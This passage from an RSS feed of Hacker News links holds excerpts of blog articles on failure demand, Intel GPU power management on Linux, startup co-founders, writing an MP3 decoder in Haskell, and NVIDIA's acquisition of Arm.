<td><span>Decision-making separated from work</span></td>
</tr>
</tbody>
</table>
<h4><b>Common Mistakes</b></h4>
<p><span>As John Seddon says, “the concept of failure demand is easy to understand and easy to misunderstand”. The misunderstanding occurs when the idea is taken out of its system thinking framework and grafted on a command and control mindset.&nbsp;</span></p>
<p><span>The most common mistakes in tackling failure demand are:</span></p>
<ol>
<li><span>Buying software to measure it and report it.<br>
</span>A complete waste of time and money. Failure demand should not be a permanent measure. It is a temporary measure that sends a clear signal of ineffectiveness. Measuring and reporting failure demand takes management’s attention in the wrong direction.</li>
<li><span>Setting targets to reduce it<br>
</span>A target is a goal without a method. Setting targets will only lead to cheating. The only target you need is to work towards perfect services, the consequence being eradication of failure demand.</li>
<li><span>Focusing on people and processes, allocating blame<br>
</span>We often see organisations – encouraged by consultants who know no better – setting up “governance” units to allocate blame to functions or processes and work across boundaries to resolve poor processes. Achieving marginal falls in failure demand hoodwinks them into believing they have the right solution. It is to fail to realise that failure demand is systemic and can only be eradicated by a change to the system.</li>
</ol>
<p><span>These kinds of initiatives will achieve modest improvements at best. The purpose is eradication.</span></p>
<p><span>Many service organisations have achieved Seddon’s high bar, where failure demand is negligible. The design of the system coheres people around a common purpose as all performance measures rise, so does morale.</span></p>
<p><span>Are you interested in developing practical skills in system redesign and giving customers what they want while lowering costs? Explore Vanguard’s <a href="https://vanguard-method.net/know-how-transfer">Know How Transfer programme</a>.</span></p>
<p><strong>Other Free Resources</strong></p>
<p><span>Webinar: <a href="https://www.youtube.com/watch?v=24t4xYW6lr0&amp;feature=youtu.be">Failure Demand from the Horse’s Mouth with John Seddon</a></span></p>

			</section></div>]]>
            </description>
            <link>https://vanguard-method.net/failure-demand/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25015475</guid>
            <pubDate>Sat, 07 Nov 2020 15:10:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting the most out of your Intel integrated GPU on Linux]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25015327">thread link</a>) | @joseluisq
<br/>
November 7, 2020 | http://jason-blog.jlekstrand.net/2020/05/getting-most-out-of-your-intel.html | <a href="https://web.archive.org/web/*/http://jason-blog.jlekstrand.net/2020/05/getting-most-out-of-your-intel.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div id="post-body-6228875266477811300">
<p>About a year ago ago, I got a new laptop: a late 2019 Razer Blade Stealth 13.&nbsp; It sports an Intel i7-1065G7 with the best Intel's Ice Lake graphics along with an NVIDIA GeForce GTX 1650.&nbsp; Apart from needing an ACPI lid quirk and the power management issues described here, it’s been a great laptop so far and the Linux experience has been very smooth.</p><p>

Unfortunately, the out-of-the-box integrated graphics performance of my new laptop was less than stellar.&nbsp; My first task with the new laptop was to debug a rendering issue in the Linux port of Shadow of the Tomb Raider which turned out to be a bug in the game.&nbsp; In the process, I discovered that the performance of the game’s built-in benchmark was almost half of Windows.&nbsp; We’ve had some performance issues with Mesa from time to time on some games but half seemed a bit extreme.&nbsp; Looking at system-level performance data with gputop revealed that GPU clock rate was unable to get above about 60-70% of the maximum in spite of the GPU being busy the whole time.&nbsp; Why?&nbsp; The GPU wasn’t able to get enough power.&nbsp; Once I sorted out my power management problems, the benchmark went from about 50-60% the speed of Windows to more like 104% the speed of windows (yes, that’s more than 100%).</p><p>

This blog post is intended to serve as a bit of a guide to understanding memory throughput and power management issues and configuring your system properly to get the most out of your Intel integrated GPU.&nbsp; Not everything in this post will affect all laptops so you may have to do some experimentation with your system to see what does and does not matter.&nbsp; I also make no claim that this post is in any way complete; there are almost certainly other configuration issues of which I'm not aware or which I've forgotten.</p><h2>
Update your drivers</h2><p>
This should go without saying but if you want the best performance out of your hardware, running the latest drivers is always recommended.&nbsp; This is especially true for hardware that has just been released.&nbsp; Generally, for graphics, most of the big performance improvements are going to be in Mesa but your Linux kernel version can matter as well.&nbsp; In the case of Intel Ice Lake processors, some of the power management features aren’t enabled until Linux 5.4.</p><p>

I’m not going to give a complete guide to updating your drivers here.&nbsp; If you’re running a distro like Arch, chances are that you’re already running something fairly close to the latest available.&nbsp; If you’re on Ubuntu, the padoka PPA provides versions of the userspace components (Mesa, X11, etc.) that are usually no more than about a week out-of-date but upgrading your kernel is more complicated.&nbsp; Other distros may have something similar but I’ll leave as an exercise to the reader.</p><p>

This doesn’t mean that you need to be obsessive about updating kernels and drivers.&nbsp; If you’re happy with the performance and stability of your system, go ahead and leave it alone.&nbsp; However, if you have brand new hardware and want to make sure you have new enough drivers, it may be worth attempting an update.&nbsp; Or, if you have the patience, you can just wait 6 months for the next distro release cycle and hope to pick up with a distro update.</p><h2>
Make sure you have dual-channel RAM</h2><p>
One of the big bottleneck points in 3D rendering applications is memory bandwidth.&nbsp; Most standard monitors run at a resolution of 1920x1080 and a refresh rate of 60 Hz.&nbsp; A 1920x1080 RGBA (32bpp) image is just shy of 8 MiB in size and, if the GPU is rendering at 60 FPS, that adds up to about 474 MiB/s of memory bandwidth to write out the image every frame.&nbsp; If you're running a 4K monitor, multiply by 4 and you get about 1.8 GiB/s.&nbsp; Those numbers are only for the final color image, assume we write every pixel of the image exactly once, and don't take into account any other memory access.&nbsp; Even in a simple 3D scene, there are other images than just the color image being written such as depth buffers or auxiliary gbuffers, each pixel typically gets written more than once depending on app over-draw, and shading typically involves reading from uniform buffers and textures.&nbsp; Modern 3D applications typically also have things such as depth pre-passes, lighting passes, and post-processing filters for depth-of-field and/or motion blur.&nbsp; The result of this is that actual memory bandwidth for rendering a 3D scene can be 10-100x the bandwidth required to simply write the color image.</p><p>

Because of the incredible amount of bandwidth required for 3D rendering, discrete GPUs use memories which are optimized for bandwidth above all else.&nbsp; These go by different names such as GDDR6 or HBM2 (current as of the writing of this post) but they all use extremely wide buses and access many bits of memory in parallel to get the highest throughput they can.&nbsp; CPU memory, on the other hand, is typically DDR4 (current as of the writing of this post) which runs on a narrower 64-bit bus and so the over-all maximum memory bandwidth is lower.&nbsp; However, as with anything in engineering, there is a trade-off being made here.&nbsp; While narrower buses have lower over-all throughput, they are much better at random access which is necessary for good CPU memory performance when crawling complex data structures and doing other normal CPU tasks.&nbsp; When 3D rendering, on the other hand, the vast majority of your memory bandwidth is consumed in reading/writing large contiguous blocks of memory and so the trade-off falls in favor of wider buses.</p><p>

With integrated graphics, the GPU uses the same DDR RAM as the CPU so it can't get as much raw memory throughput as a discrete GPU.&nbsp; Some of the memory bottlenecks can be mitigated via large caches inside the GPU but caching can only do so much.&nbsp; At the end of the day, if you're fetching 2 GiB of memory to draw a scene, you're going to blow out your caches and load most of that from main memory.</p><p>

The good news is that most motherboards support a dual-channel ram configurations where, if your DDR units are installed in identical pairs, the memory controller will split memory access between the two DDR units in the pair.&nbsp; This has similar benefits to running on a 128-bit bus but without some of the drawbacks.&nbsp; The result is about a 2x improvement in over-all memory throughput.&nbsp; While this may not affect your CPU performance significantly outside of some very special cases, it makes a huge difference to your integrated GPU which cares far more about total throughput than random access.&nbsp; If you are unsure how your computer's RAM is configured, you can run “dmidecode -t memory” and see if you have two identical devices reported in different channels.</p><h2>
Power management 101</h2><p>
Before getting into the details of how to fix power management issues, I should explain a bit about how power management works and, more importantly, how it doesn’t.&nbsp; If you don’t care to learn about power management and are just here for the system configuration tips, feel free to skip this section.</p><p>

Why is power management important?&nbsp; Because the clock rate (and therefore the speed) of your CPU or GPU is heavily dependent on how much power is available to the system.&nbsp; If it’s unable to get enough power for some reason, it will run at a lower clock rate and you’ll see that as processes taking more time or lower frame rates in the case of graphics.&nbsp; There are some things that you, as the user, cannot control such as the physical limitations of the chip or the way the OEM has configured things on your particular laptop.&nbsp; However, there are some things which you can do from a system configuration perspective which can greatly affect power management and your performance.</p><p>

First, we need to talk about thermal design power or TDP.&nbsp; There is a lot of misunderstanding on the internet about TDP and we need to clear some of them up.&nbsp; Wikipedia defines TDP as “the maximum amount of heat generated by a computer chip or component that the cooling system in a computer is designed to dissipate under any workload.”&nbsp; The Intel Product Specifications site defines TDP as follows:</p><p>

Thermal Design Power (TDP) represents the average power, in watts, the processor dissipates when operating at Base Frequency with all cores active under an Intel-defined, high-complexity workload. Refer to Datasheet for thermal solution requirements.</p><p>

In other words, the TDP value provided on the Intel spec sheet is a pretty good design target for OEMs but doesn’t provide nearly as many guarantees as one might hope.&nbsp; In particular, there are several things that the TDP value on the spec sheet is not:</p><ul>
<li>It’s not the exact maximum power.&nbsp; It’s a “average power”.</li>
<li>It may not match any particular workload.&nbsp; It’s based on “an Intel-defined, high-complexity workload”.&nbsp; Power consumption on any other workload is likely to be slightly different.</li>
<li>It’s not the actual maximum.&nbsp; It’s based on when the processor is “operating at Base Frequency with all cores active.” Technologies such as Turbo Boost can cause the CPU to operate at a higher power for short periods of time.</li>
</ul><p>
If you look at the&nbsp; Intel Product Specifications page for the i7-1065G7, you’ll see three TDP values: the nominal TDP of 15W, a configurable TDP-up value of 25W and a configurable TDP-down value of 12W.&nbsp; The nominal TDP (simply called “TDP”) is the base TDP which is enough for the CPU to run all of its cores at the base frequency which, given sufficient cooling, it can do in the steady state.&nbsp; The TDP-up and TDP-down values provide configurability that gives the OEM options when they go to make a laptop based on the i7-1065G7.&nbsp; If they’re making a performance laptop like Razer and are willing to put in enough cooling, they can configure it to 25W and get more performance.&nbsp; On the other hand, if they’re going for battery life, they can put the exact same chip in the laptop but configure it to run as low as 12W.&nbsp; They can also configure the chip to run at 12W or 15W and then ship software with the computer which will bump it to 25W once Windows boots up.&nbsp; We’ll talk more about this reconfiguration …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://jason-blog.jlekstrand.net/2020/05/getting-most-out-of-your-intel.html">http://jason-blog.jlekstrand.net/2020/05/getting-most-out-of-your-intel.html</a></em></p>]]>
            </description>
            <link>http://jason-blog.jlekstrand.net/2020/05/getting-most-out-of-your-intel.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25015327</guid>
            <pubDate>Sat, 07 Nov 2020 14:44:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Free Illustrations for Geeks – Kung Fu Geek]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25015209">thread link</a>) | @seuyu_bin
<br/>
November 7, 2020 | https://flat-svg-designs.net/en/kung-fu-geek/ | <a href="https://web.archive.org/web/*/https://flat-svg-designs.net/en/kung-fu-geek/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Welcome!</p><p>Free vector(SVG) icons and illustrations with flat design.</p><div><p><a href="https://flat-svg-designs.net/en/info/terms/">Check Terms of Use</a></p></div><div><p><span>Follow Me</span></p><div><p><a href="https://twitter.com/flatsvgdesigns"><img src="https://flat-svg-designs.net/images/Twitter_Logo_WhiteOnBlue.svg" alt="twitter icon" loading="lazy"></a></p><p><img src="https://flat-svg-designs.net/images/hatenabookmark.svg" alt="hatenabookmark icon" loading="lazy"></p></div></div></div></div>]]>
            </description>
            <link>https://flat-svg-designs.net/en/kung-fu-geek/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25015209</guid>
            <pubDate>Sat, 07 Nov 2020 14:21:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Frameworks and philosophy for thinking about a startup co-founder]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25015158">thread link</a>) | @akashtndn
<br/>
November 7, 2020 | https://www.akashtandon.in/startup/2020-07-12-cofounder-frameworks-philosophy/ | <a href="https://web.archive.org/web/*/https://www.akashtandon.in/startup/2020-07-12-cofounder-frameworks-philosophy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-startup-cofounder-frameworks-philosophy" class="page" role="article"><header><p> <time datetime="2020-07-12T00:00:00+00:00">12 Jul 2020</time> in <a href="https://www.akashtandon.in/startup/">Startup</a></p><p> A guiding philosophy and collection of frameworks for thinking about a startup co-founder.</p></header><p><em>Note: In addition to experience as an early startup employee, the below content has been derived through learnings from <a href="https://www.ankurwarikoo.com/about/">Ankur Warikoo</a>’s Future Founders conference and the <a href="https://www.joinef.com/">Entrepreneur First</a> program.</em></p><p>We have all heard the stories. They met, they started up and they conquered. They are the co-founders.<br> There are a ton of variables at play in an entrepreneurial journey. These include the market, capital and good ol’ luck. The market won’t care about whether a startup team has been awake for days or not drawn a salary. The humans you work with will. Good co-founders and founding teams can help each other manage a startup’s variability and chaos. Thinking deeply about who you want to work with is as important as anything else as an entrepreneur.</p><p>There are no strict rules or absolutes when it comes to a startup. Popular startup folklore may lead you to believe that finding a co-founder is almost entirely down to luck. Luck is a factor, yes. That doesn’t mean there is no method to the madness.<br> This article aims to lay down some frameworks and a philosophy to think about a co-founder and to a lesser extent, founding team. There are no easy answers to be found. But if you can ask the right questions, that can immensely help your journey.</p><h2 id="starting-with-self">Starting with self</h2><p>Before ‘product-market’ fit comes ‘founder-market’, ‘founder-product’ and ‘founder-founder’ fit. You need to be honest with yourself before you can go about expecting the same of others. It does not come easy. It is easily worth the effort though. Ask questions such as:</p><ul><li>Why are you doing this startup?</li><li>Do you really care about the problem?</li><li>What is your financial position? How important is money to you?</li><li>How much time are you willing to commit?</li><li>Do you think deeply about things or want to get shit done quickly?</li><li>What kind of work-life balance do you want?</li><li>Are you comfortable delegating or do you prefer to micro-manage?<ul><li>Alternatively, are you a control freak or not?</li></ul></li></ul><p>.. and so on.</p><p>I am not qualified to comment on right or wrong answers. A relevant article in that regard is Mark Andreessen’s <a href="https://pmarchive.com/guide_to_startups_part1.html">Why not to do a startup</a>. I can tell you this much - the clarity will help you make decisions quickly and decisively. That is a big positive.</p><h2 id="solo-or-not">Solo or not</h2><p>“Do you even need a co-founder?”</p><p>If you plan to startup and don’t have a college dormmate co-founder, you most likely have asked the above. Paraphrasing a founder friend, “if you want to stay healthy and not wear yourself out, do not go solo.” That does make sense but there’s more to it.</p><p>Ankur Warikoo offers the below framework to think about this question.</p><p><img src="https://www.akashtandon.in/assets/img/cofounder_control_skill_matrix.jpeg" alt="Co-founder control-skill matrix"></p><p>X-axis refers to the core skill that your startup requires. For example, a deep tech startup will hinge heavily on technology and engineering. An ops-heavy one requires relevant operations expertise.<br> Y-axis refers to your need for control or micro-management as a professional. The term “control freak” doesn’t have a negative connotation here.</p><p>I am still trying to digest this skill-control framework. It does offer some clarity though.</p><h2 id="the-dream-team">The dream team</h2><p>This is the big question. What makes a good co-founder? There are couple of common-sense frameworks that I have recently come across which try to answer this.</p><h3 id="weighing-the-skills-ideas-and-values">Weighing the skills, ideas and values</h3><p>Assess skills, ideas and values on an individual level. That is the core idea behind the below framework proposed by Ankur Warikoo.</p><ul><li>‘Skills’ are self-explanatory.</li><li>‘Ideas’ refers to the way of thinking and approaching problems. An example of contrasting approaches is an instinct to get shit done quickly versus thinking deeply first.</li><li>‘Values’ are the principles that someone uses to make decisions, big or small. It is an abstract concept. You assess it the same way that you would possibly do it for a life-partner. It’s hard to ascertain, I know.</li></ul><p><img src="https://www.akashtandon.in/assets/img/cofounder_skill_idea_value_matrix.jpeg" alt="Co-founder skill-idea-value matrix "></p><p>The above table describes the most probable scenarios that can arise as a result of the corresponding skill-idea-value dynamic between the co-founders. It is a neat way to simplify a complex equation.</p><h3 id="thinking-about-edge">Thinking about edge</h3><p><a href="https://www.joinef.com/">Entrepreneur First</a> (EF) is a global program that helps ambitious individuals build deep-tech startups. It helps you find a co-founder and raise capital. Their philosophy heavily uses the concept of ‘<a href="https://medium.com/entrepreneur-first/ideas-pt-ii-finding-your-edge-8808121b591b">edge</a>’. EF defines 3 broad edge types:</p><ul><li>Domain (D): Years of experience in a certain industry along with insights on how it can be improved</li><li>Technical (T): Experts and researchers in a particular technology</li><li>Catalyst (C): Business or technology generalists</li></ul><p>EF’s thesis states that successful deep tech companies are primarily formed by relevant combinations of edges. For example, D+T or D+C(tech).</p><h3 id="boiling-it-down">Boiling it down</h3><p>In simpler words, you need complimentary skillsets and temperament on a good co-founding team. If someone is building a product, someone needs to sell it. There will be exceptions but this holds true in most cases. Another key takeaway is that the values need to be aligned from the get go. That is the most human element of the lot. It may be overlooked if you rush through things. Avoid that at all costs.</p><h2 id="parting-words">Parting words</h2><p>Take all of the above with a pinch of salt. I am not a successful entrepreneur. In fact, I am looking for a co-founder these days. That is why I refrain from being prescriptive. That being said, I have tapped into enough collective wisdom and gained experience to know that the above frameworks are helpful.</p><p>Do not fret too much about the nitty-gritties. The frameworks will guide you but that is all they will do. The journey is yours to make. Try to be self-aware and honest. Enjoy along the way.</p><p>May the force be with you!</p><hr><p>Source for header image: <a href="https://www.pikrepo.com/fqexf/two-man-fist-hands">Pikrepo</a></p></article></div>]]>
            </description>
            <link>https://www.akashtandon.in/startup/2020-07-12-cofounder-frameworks-philosophy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25015158</guid>
            <pubDate>Sat, 07 Nov 2020 14:11:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Let’s build an MP3-decoder (2008)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25015129">thread link</a>) | @Tomte
<br/>
November 7, 2020 | http://blog.bjrn.se/2008/10/lets-build-mp3-decoder.html | <a href="https://web.archive.org/web/*/http://blog.bjrn.se/2008/10/lets-build-mp3-decoder.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<div>
      <p>Even though MP3 is probably the single most well known file format and codec on Earth, itâ€™s not very well understood by most 

programmers â€“ for many encoders/decoders is in the class of software â€œother peopleâ€� write, like standard libraries or operating system 

kernels. This article will attempt to demystify the decoder, with short top-down primers on signal processing and information theory 

when necessary. Additionally, a small but not full-featured decoder will be written (in Haskell), suited to play around with.</p>

<p>The focus on this article is on concepts and the design choices the MPEG team made when they designed the codec â€“ not on 

uninteresting implementation details or heavy theory. Some parts of a decoder are quite arcane and are better understood by reading the 

specification, a good book on signal processing, or the many papers on MP3 (see references at the end).</p>

<p>A note on the code: The decoder accompanying this article is written for readability, not speed. Additionally, some unusual features 

have been left out. The end result is a decoder that is inefficient and not standards compliant, but with hopefully readable code. You 

can grab the source here: <a href="http://hackage.haskell.org/cgi-bin/hackage-scripts/package/mp3decoder">mp3decoder-0.0.1.tar.gz</a>. 

Scroll down to the bottom of the article or see README for build instructions.</p>

<p>A fair warning: The author is a hobby programmer, not an authority in signal processing. If you find an error, please drop me an 

e-mail. be@bjrn.se</p>

<p>With that out of the way, we begin our journey with the ear.</p>

<!-- ------------------------------------------------------------------------- -->

<h3>Human hearing and psychoacoustics</h3>

<p>The main idea of MP3 encoding, and lossy audio coding in general, is removing acoustically irrelevant information from an audio 

signal to reduce its size. The job of the encoder is to remove some or all information from a signal component, while at the same time 

not changing the signal in such a way audible artifacts are introduced.</p>

<p>Several properties (or â€œdeficienciesâ€�) of human hearing are used by lossy audio codecs. One basic property is we canâ€™t hear above 20 

kHz or below 20 Hz, approximately. Additionally, thereâ€™s a threshold of hearing â€“ once a signal is below a certain threshold it canâ€™t 

be heard, itâ€™s too quiet. This threshold varies with frequency; a 20 Hz tone can only be heard if itâ€™s stronger than around 60 

decibels, while frequencies in the region 1-5 kHz can easily be perceived at low volume.</p>

<p>A very important property affecting the auditory system is known as <i>masking</i>. A loud signal will â€œmaskâ€� other signals 

sufficiently close in frequency or time; meaning the loud signal modifies the threshold of hearing for spectral and temporal neighbors. 

This property is very useful: not only can the nearby masked signals be removed; the audible signal can also be compressed further as 

the noise introduced by heavy compression will be masked too.</p>

<p>This masking phenomenon happens within frequency regions known as <i>critical bands</i> â€“ a strong signal within a critical band 

will mask frequencies within the band. We can think of the ear as a set of band pass filters, where different parts of the ear pick up 

different frequency regions. An audiologist or acoustics professor have plenty to say about critical bands and the subtleties of 

masking effects, however in this article we are taking a simplified engineering approach: for our purpose itâ€™s enough to think of these 

critical bands as fixed frequency regions where masking effects occur.</p>

<p>Using the properties of the human auditory system, lossy codecs and encoders remove inaudible signals to reduce the information 

content, thus compressing the signal. The MP3 standard does not dictate how an encoder should be written (though it assumes the 

existence of critical bands), and implementers have plenty of freedom to remove content they deem imperceptible. One encoder may decide 

a particular frequency is inaudible and should be removed, while another encoder keeps the same signal. Different encoders use 

different <i>psychoacoustic models</i>, models describing how humans perceive sounds and thus what information may be removed.</p>

<!-- ------------------------------------------------------------------------- -->

<h3>About MP3</h3>

<p>Before we begin decoding MP3, it is necessary to understand exactly what MP3 <i>is</i>. MP3 is a codec formally known as MPEG-1 

Audio Layer 3, and it is defined in the MPEG-1 standard. This standard defines three different audio codecs, where layer 1 is the 

simplest that has the worst compression ratio, and layer 3 is the most complex but has the highest compression ratio and the best audio 

quality per bit rate. Layer 3 is based on layer 2, in turn based on layer 1. All of the three codecs share similarities and have many 

encoding/decoding parts in common. </p>

<p>The rationale for this design choice made sense back when the MPEG-1 standard was first written, as the similarities between the 

three codecs would ease the job for implementers. In hindsight, building layer 3 on top of the other two layers was perhaps not the 

best idea. Many of the advanced features of MP3 are shoehorned into place, and are more complex than they would have been if the codec 

was designed from scratch. In fact, many of the features of AAC were designed to be â€œsimplerâ€� than the counterpart in MP3. </p>

<p>At a very high level, an MP3 encoder works like this: An input source, say a WAV file, is fed to the encoder. There the signal is 

split into parts (in the time domain), to be processed individually. The encoder then takes one of the short signals and transforms it 

to the frequency domain. The psychoacoustic model removes as much information as possible, based on the content and phenomena such as 

masking. The frequency samples, now with less information, are compressed in a generic lossless compression step. The samples, as well 

as parameters how the samples were compressed, are then written to disk in a binary file format.</p>

<p>The decoder works in reverse. It reads the binary file format, decompress the frequency samples, reconstructs the samples based on 

information how content was removed by the model, and then transforms them to the time domain. Letâ€™s start with the binary file 

format.</p>

<!-- ------------------------------------------------------------------------- -->

<h3>Decoding, step 1: Making sense of the data</h3>

<p>Many computer users know that an MP3 are made up of several â€œframesâ€�, consecutive blocks of data. While important for unpacking the 

bit stream, frames are not fundamental and cannot be decoded individually. In this article, what is usually called a frame we call a 

<i>physical frame</i>, while we call a block of data that can actually be decoded a <i>logical frame</i>, or simply just a frame.</p>

<p>A logical frame has many parts: it has a 4 byte <i>header</i> easily distinguishable from other data in the bit stream, it has 17 or 

32 bytes known as <i>side information</i>, and a few hundred bytes of <i>main data</i>.</p>

<p>A physical frame has a header, an optional 2 byte checksum, side information, but only some of the main data unless in very rare 

circumstances. The screenshot below shows a physical frame as a thick black border, the frame header as 4 red bytes, and the side 

information as blue bytes (this MP3 does not have the optional checksum). The grayed out bytes is the main data that corresponds to the 

highlighted header and side information. The header for the following physical frame is also highlighted, to show the header always 

begin at offset 0.</p>

<p>The absolutely first thing we do when we decode the MP3 is to unpack the physical frames to logical frames â€“ this is a means of 

abstraction, once we have a logical frame we can forget about everything else in the bit stream. We do this by reading an offset value 

in the side information that point to the beginning of the main data.</p>

<p><img src="http://www.bjrn.se/mp3dec/logicalframe.gif"></p> 

<p>Whyâ€™s not the main data for a logical frame kept within the physical frame? At first this seems unnecessarily clumsy, but it has 

some advantages. The length of a physical frame is constant (within a byte) and solely based on the bit rate and other values stored in 

the easily found header. This makes seeking to arbitrary frames in the MP3 efficient for media players. Additionally, as frames are not 

limited to a fixed size in bits, parts of the audio signal with complex sounds can use bytes from preceding frames, in essence giving 

all MP3:s variable bit rate.</p>

<p>There are some limitations though: a frame can save its main data in several preceding frames, but not following frames â€“ this would 

make streaming difficult. Also, the main data for a frame cannot be arbitrarily large, and is limited to about 500 bytes. This is limit 

is fairly short, and is often criticized. </p>

<p>The perceptive reader may notice the gray main data bytes in the image above begin with an interesting pattern (<code>3E 50 00 

00</code>â€¦) that resembles the first bytes of the main data in the next logical frame (<code>38 40 00 00</code>â€¦). There is some 

structure in the main data, but usually this wonâ€™t be noticeable in a hex editor.</p>

<p>To work with the bit stream, we are going to use a very simple type:</p>

<pre>data MP3Bitstream = MP3Bitstream {
    bitstreamStream :: B.ByteString,
    bitstreamBuffer :: [Word8]
}</pre>

<p>Where the <code>ByteString</code> is the unparsed bit stream, and the <code>[Word8]</code> is an internal buffer used to reconstruct 

logical frames from physical frames. Not familiar with Haskell? Donâ€™t worry; all the code in this article is only complementary.</p>

<p>As the bit stream may contain data we consider garbage, such as ID3 tags, we are using a simple helper function, 

<code>mp3Seek</code>, which takes the <code>MP3Bitstream</code> and discards bytes until it finds a valid header. The new 

<code>MP3Bitstream</code> can then be passed to a function that does the actual physical to logical unpacking. </p>

<pre>mp3Seek :: MP3Bitstream -&gt; Maybe MP3Bitstream
mp3UnpackFrame :: MP3Bitstream -&gt; (MP3Bitstream, Maybe MP3LogicalFrame)</pre>

<h4>The anatomy of a logical frame</h4>

<p>When weâ€™re done decoding proper, a logical frame will have yielded us exactly 1152 time domain samples per channel. In a typical PCM 

WAV file, storing these samples would require 2304 bytes per channel â€“ …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://blog.bjrn.se/2008/10/lets-build-mp3-decoder.html">http://blog.bjrn.se/2008/10/lets-build-mp3-decoder.html</a></em></p>]]>
            </description>
            <link>http://blog.bjrn.se/2008/10/lets-build-mp3-decoder.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25015129</guid>
            <pubDate>Sat, 07 Nov 2020 14:04:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nvidia's Acquisition of Arm; What Are the Consequences?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25014986">thread link</a>) | @sfmth
<br/>
November 7, 2020 | https://jscitech.ir/news-views/nvidia-buy-arm-what-consequence/farhad/424/ | <a href="https://web.archive.org/web/*/https://jscitech.ir/news-views/nvidia-buy-arm-what-consequence/farhad/424/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><main role="main" itemscope="itemscope" itemtype="https://schema.org/Blog"><div><div>



<div itemprop="image" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><div><p><a href="https://jscitech.ir/news-views/nvidia-buy-arm-what-consequence/farhad/424/"><img loading="lazy" width="833" height="469" src="https://jscitech.ir/wp-content/uploads/2020/10/NVIDIAs-Acquisition-of-Arm-What-are-the-Consequences1.jpg" alt="nvidia buys arm; what re the consequences?" title="NVIDIA's Acquisition of Arm; What are the Consequences?1" itemprop="thumbnailUrl"></a></p></div></div>

<section itemscope="itemscope" itemtype="https://schema.org/BlogPosting" itemprop="blogPost"><div itemprop="text"><p>On 13 September 2020, NVIDIA announced that it will be acquiring Arm for $40 billion. As you might know, Arm is powering lots of devices including most smartphones, and its open-licensing policy and unrivaled performance at low power applications have attracted all kinds of customers worldwide. However, analysts are suggesting that this deal could be the Arm’s downfall thus it might also trigger a boost for Arm’s competitor, RISC-V.</p>
<p>NVIDIA and SoftBank had previously announced a definitive agreement under which NVIDIA would acquire Arm Limited from SoftBank in a transaction valued at $40 billion. NVIDIA aims to collaborate with Arm and expand their R&amp;D in artificial intelligence applications. Furthermore, they profess to retain Arm’s business model and its headquarters in Cambridge, UK.</p>
<p>The deal is predicted to take 18 months to complete, as they have to secure regulatory approvals for the U.K., China, the European Union and the United States. There are concerns that Britain might not approve this deal in that NVIDIA’s policies about Arm, wouldn’t necessarily satisfy them. There is also China which has a high probability of rejecting the deal owing to the U.S.-China trade war.</p>
<p>NVIDIA is an American company which designs high performance GPUs for gaming, professional use, HPC and artificial intelligence.&nbsp; In addition, they provide accelerators, embedded solutions and automotive solutions. Arm Ltd. on the other hand, is a semiconductor and software design company located in Cambridge, England. They design ARM processors, Mali GPUs, SoCs and software development tools. They have over 1000 partners and are powering 180 billion devices worldwide. Moreover, since 2016 The company has been owned by SoftBank Group. Both NVIDIA and Arm are pushing the boundaries of the world’s technology with top of the line solutions.</p>
<p>Recently a few semiconductor companies, among them Samsung, were keen to buy Arm, but NVIDIA stole the thunder and acquired Arm for a high stake of $40 billion. Meanwhile, the deal has reportedly alerted analysts, according to <a href="https://twitter.com/chiakokhua">Mr. Chia</a>, this deal would not only damage Arm, but also the industry and the consumers, just because NVIDIA wouldn’t be operating Arm as a totally independent company. This acquisition will grant NVIDIA control over Arm’s policies, licensing terms, fees and royalties, and therefore enables NVIDIA to destabilize Arm’s relations with its customers.</p>
<p>Arm is an essential part of the industry, therefore preserving its neutrality is of great importance. However, NVIDIA by gaining access to Arm’s confidential information would be able to access Arm’s upcoming designs and deploy them ahead of the competition. Furthermore, NVIDIA could also abuse Arm’s clients’ crucial information and gain unfair advantage over the competition.</p>
<p>Eventually in a few years NVIDIA could own Arm exclusively and make its ecosystem a deep pit that traps customers, just like CUDA. If you want to know about the bad reputation of NVIDIA’s policies you should ask Linus Torvalds. He is the founder and the maintainer of Linux and has worked with multiple big companies. In an interview back in 2012 at Aalto university, he literally showed his middle finger to NVIDIA due to their atrocious behavior.</p>
<blockquote>
<p>“NVIDIA has been one of the worst trouble spots we’ve had with hardware manufacturers, and that is really sad because NVIDIA tries to sell chips, alot of chips, into the android market, and nvidia has been the single worst company we’ve ever dealt with, so NVIDIA f_ck you.”</p>
<p><a href="https://www.youtube.com/watch?v=IVpOyKCNZYw">Linus Torvalds, Aalto Talks, 14 June 2012</a></p>
</blockquote>
<p>NVIDIA, by owning Arm would be able to disrupt the entire industry with a single shot, and promote its own legacy too. That’s in fact what a wise man would do for his own company despite the fact that it could be bad for the industry and us. Talking about NVIDIA’s benefits, they will probably shift resources towards data centers and AI as profits from smartphone and embedded markets are not desirable.</p>
